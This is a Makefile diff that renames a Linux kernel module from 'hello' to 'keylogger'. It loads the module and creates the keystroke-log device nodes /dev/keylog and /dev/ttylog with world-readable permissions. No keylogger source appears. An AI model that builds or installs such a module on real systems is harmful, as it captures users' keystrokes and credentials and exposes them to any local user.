@@ -1,4 +1,4 @@
-obj-m := hello.o
+obj-m := keylogger.o
 
 NODE=/dev/keylog
 TTYNODE=/dev/ttylog
@@ -11,10 +11,10 @@ install:
 	mknod $(TTYNODE) c 66 0
 	chmod 666 $(NODE)
 	chmod 666 $(TTYNODE)
-	insmod hello.ko
+	insmod keylogger.ko
 
 uninstall:
-	rmmod hello
+	rmmod keylogger
 	rm -rf $(NODE)
 	rm -rf $(TTYNODE)
 
@@ -26,7 +26,7 @@ rmfiles:
 	rm -rf $(TTYNODE)
 
 i:
-	rmmod hello
+	rmmod keylogger
 	rm -rf $(NODE)
 	rm -rf $(TTYNODE)
 	make -C /usr/src/linux-2.6.32.5/ M=$(PWD) clean
@@ -35,4 +35,4 @@ i:
 	mknod $(TTYNODE) c 66 0
 	chmod 666 $(NODE)
 	chmod 666 $(TTYNODE)
-	insmod hello.ko
+	insmod keylogger.ko
